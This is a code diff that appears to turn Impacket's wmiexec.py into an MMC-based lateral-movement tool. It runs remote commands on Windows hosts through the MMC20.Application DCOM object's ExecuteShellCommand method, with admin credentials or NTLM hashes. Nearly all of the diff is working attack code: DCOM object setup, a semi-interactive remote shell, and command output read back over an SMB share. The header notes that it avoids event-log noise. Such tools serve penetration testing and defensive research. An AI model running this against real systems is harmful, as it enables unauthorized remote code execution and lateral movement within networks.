@@ -5,12 +5,15 @@
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# A similar approach to smbexec but executing commands through WMI.
+# A similar approach to wmiexec but executing commands through MMC.
 # Main advantage here is it runs under the user (has to be Admin) 
 # account, not SYSTEM, plus, it doesn't generate noisy messages
 # in the event log that smbexec.py does when creating a service.
 # Drawback is it needs DCOM, hence, I have to be able to access 
 # DCOM ports at the target machine.
+#
+# Original discovery by Matt Nelson (@enigma0x3):
+# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
 #
 # Author:
 #  beto (@agsolino)
@@ -18,27 +21,34 @@
 # Reference for:
 #  DCOM
 #
+# ToDo:
+# [ ] Kerberos auth not working, invalid_checksum is thrown. Most probably sequence numbers out of sync due to
+#     getInterface() method
+#
 
-import sys
-import os
-import cmd
 import argparse
-import time
+import cmd
 import logging
-import string
 import ntpath
+import os
+import string
+import sys
+import time
 
-from impacket.examples import logger
 from impacket import version
-from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
+from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
+    VARIANT, VARENUM, DISPATCH_METHOD
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
-from impacket.dcerpc.v5.dcom import wmi
+from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
+    OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
+    IRemUnknown2, INTERFACE
 from impacket.dcerpc.v5.dtypes import NULL
+from impacket.examples import logger
+from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
 
 OUTPUT_FILENAME = '__' + str(time.time())
-CODEC = sys.getdefaultencoding()
 
-class WMIEXEC:
+class MMCEXEC:
     def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
                  noOutput=False, doKerberos=False, kdcHost=None):
         self.__command = command
@@ -55,6 +65,26 @@ class WMIEXEC:
         self.shell = None
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
+
+    def getInterface(self, interface, resp):
+        # Now let's parse the answer and build an Interface instance
+        objRefType = OBJREF(''.join(resp))['flags']
+        objRef = None
+        if objRefType == FLAGS_OBJREF_CUSTOM:
+            objRef = OBJREF_CUSTOM(''.join(resp))
+        elif objRefType == FLAGS_OBJREF_HANDLER:
+            objRef = OBJREF_HANDLER(''.join(resp))
+        elif objRefType == FLAGS_OBJREF_STANDARD:
+            objRef = OBJREF_STANDARD(''.join(resp))
+        elif objRefType == FLAGS_OBJREF_EXTENDED:
+            objRef = OBJREF_EXTENDED(''.join(resp))
+        else:
+            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)
+
+        return IRemUnknown2(
+            INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
+                      oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
+                      target=interface.get_target()))
 
     def run(self, addr):
         if self.__noOutput is False:
@@ -80,21 +110,39 @@ class WMIEXEC:
         dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                               self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
         try:
-            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
-            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
-            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
-            iWbemLevel1Login.RemRelease()
+            iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
+            iMMC = IDispatch(iInterface)
 
-            win32Process,_ = iWbemServices.GetObject('Win32_Process')
+            resp = iMMC.GetIDsOfNames(('Document',))
 
-            self.shell = RemoteShell(self.__share, win32Process, smbConnection)
+            dispParams = DISPPARAMS(None, False)
+            dispParams['rgvarg'] = NULL
+            dispParams['rgdispidNamedArgs'] = NULL
+            dispParams['cArgs'] = 0
+            dispParams['cNamedArgs'] = 0
+            resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+
+            iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+            resp = iDocument.GetIDsOfNames(('ActiveView',))
+            resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+
+            iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+            pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
+
+            pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+
+            self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection)
             if self.__command != ' ':
                 self.shell.onecmd(self.__command)
+                if self.shell is not None:
+                    self.shell.do_exit('')
             else:
                 self.shell.cmdloop()
         except  (Exception, KeyboardInterrupt), e:
             #import traceback
             #traceback.print_exc()
+            if self.shell is not None:
+                self.shell.do_exit('')
             logging.error(str(e))
             if smbConnection is not None:
                 smbConnection.logoff()
@@ -107,15 +155,16 @@ class WMIEXEC:
         dcom.disconnect()
 
 class RemoteShell(cmd.Cmd):
-    def __init__(self, share, win32Process, smbConnection):
+    def __init__(self, share, quit, executeShellCommand, smbConnection):
         cmd.Cmd.__init__(self)
         self.__share = share
-        self.__output = '\\' + OUTPUT_FILENAME
-        self.__outputBuffer = unicode('')
-        self.__shell = 'cmd.exe /Q /c '
-        self.__win32Process = win32Process
+        self.__output = '\\' + OUTPUT_FILENAME 
+        self.__outputBuffer = ''
+        self.__shell = 'c:\\windows\\system32\\cmd.exe'
+        self.__quit = quit
+        self.__executeShellCommand = executeShellCommand
         self.__transferClient = smbConnection
-        self.__pwd = unicode('C:\\')
+        self.__pwd = 'C:\\'
         self.__noOutput = False
         self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'
 
@@ -186,6 +235,14 @@ class RemoteShell(cmd.Cmd):
             pass
 
     def do_exit(self, s):
+        dispParams = DISPPARAMS(None, False)
+        dispParams['rgvarg'] = NULL
+        dispParams['rgdispidNamedArgs'] = NULL
+        dispParams['cArgs'] = 0
+        dispParams['cNamedArgs'] = 0
+
+        self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams,
+                                             0, [], [])
         return True
 
     def emptyline(self):
@@ -194,13 +251,13 @@ class RemoteShell(cmd.Cmd):
     def do_cd(self, s):
         self.execute_remote('cd ' + s)
         if len(self.__outputBuffer.strip('\r\n')) > 0:
-            print self.__outputBuffer.decode(CODEC)
+            print self.__outputBuffer
             self.__outputBuffer = ''
         else:
-            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
+            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
             self.execute_remote('cd ')
-            self.__pwd = self.__outputBuffer.strip('\r\n').decode(CODEC)
-            self.prompt = unicode(self.__pwd + '>').encode(sys.stdout.encoding)
+            self.__pwd = self.__outputBuffer.strip('\r\n')
+            self.prompt = self.__pwd + '>'
             self.__outputBuffer = ''
 
     def default(self, line):
@@ -210,14 +267,14 @@ class RemoteShell(cmd.Cmd):
             self.execute_remote(line)
             if len(self.__outputBuffer.strip('\r\n')) > 0: 
                 # Something went wrong
-                print self.__outputBuffer.decode(CODEC)
+                print self.__outputBuffer
                 self.__outputBuffer = ''
             else:
                 # Drive valid, now we should get the current path
                 self.__pwd = line
                 self.execute_remote('cd ')
                 self.__pwd = self.__outputBuffer.strip('\r\n')
-                self.prompt = unicode(self.__pwd + '>').encode(sys.stdout.encoding)
+                self.prompt = self.__pwd + '>'
                 self.__outputBuffer = ''
         else:
             if line != '':
@@ -248,21 +305,49 @@ class RemoteShell(cmd.Cmd):
         self.__transferClient.deleteFile(self.__share, self.__output)
 
     def execute_remote(self, data):
-        command = self.__shell + data 
+        command = '/Q /c ' + data
         if self.__noOutput is False:
             command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
-        self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
+
+        dispParams = DISPPARAMS(None, False)
+        dispParams['rgdispidNamedArgs'] = NULL
+        dispParams['cArgs'] = 4
+        dispParams['cNamedArgs'] = 0
+        arg0 = VARIANT(None, False)
+        arg0['clSize'] = 5
+        arg0['vt'] = VARENUM.VT_BSTR
+        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg0['_varUnion']['bstrVal']['asData'] = self.__shell
+
+        arg1 = VARIANT(None, False)
+        arg1['clSize'] = 5
+        arg1['vt'] = VARENUM.VT_BSTR
+        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg1['_varUnion']['bstrVal']['asData'] = self.__pwd
+
+        arg2 = VARIANT(None, False)
+        arg2['clSize'] = 5
+        arg2['vt'] = VARENUM.VT_BSTR
+        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg2['_varUnion']['bstrVal']['asData'] = command
+
+        arg3 = VARIANT(None, False)
+        arg3['clSize'] = 5
+        arg3['vt'] = VARENUM.VT_BSTR
+        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg3['_varUnion']['bstrVal']['asData'] = '7'
+        dispParams['rgvarg'].append(arg3)
+        dispParams['rgvarg'].append(arg2)
+        dispParams['rgvarg'].append(arg1)
+        dispParams['rgvarg'].append(arg0)
+
+        self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
+                                             0, [], [])
         self.get_output()
 
     def send_data(self, data):
-        try:
-            self.execute_remote(data)
-            print self.__outputBuffer.decode(CODEC)
-        except UnicodeDecodeError, e:
-            logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
-                          'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
-                          'again with -codec and the corresponding codec')
-            print self.__outputBuffer
+        self.execute_remote(data)
+        print self.__outputBuffer
         self.__outputBuffer = ''
 
 class AuthFileSyntaxError(Exception):
@@ -328,11 +413,6 @@ if __name__ == '__main__':
     parser.add_argument('-nooutput', action='store_true', default = False, help='whether or not to print the output '
                                                                                 '(no SMB connection created)')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
-                                                       '"%s"). If errors are detected, run chcp.com at the target, '
-                                                       'map the result with '
-                          'https://docs.python.org/2.4/lib/standard-encodings.html and then execute wmiexec.py '
-                          'again with -codec and the corresponding codec ' % CODEC)
 
     parser.add_argument('command', nargs='*', default = ' ', help='command to execute at the target. If empty it will '
                                                                   'launch a semi-interactive shell')
@@ -356,9 +436,6 @@ if __name__ == '__main__':
         sys.exit(1)
 
     options = parser.parse_args()
-
-    if options.codec is not None:
-        CODEC = options.codec
 
     if ' '.join(options.command) == ' ' and options.nooutput is True:
         logging.error("-nooutput switch and interactive shell not supported")
@@ -394,7 +471,7 @@ if __name__ == '__main__':
         if options.aesKey is not None:
             options.k = True
 
-        executer = WMIEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey,
+        executer = MMCEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey,
                            options.share, options.nooutput, options.k, options.dc_ip)
         executer.run(address)
     except (Exception, KeyboardInterrupt), e:
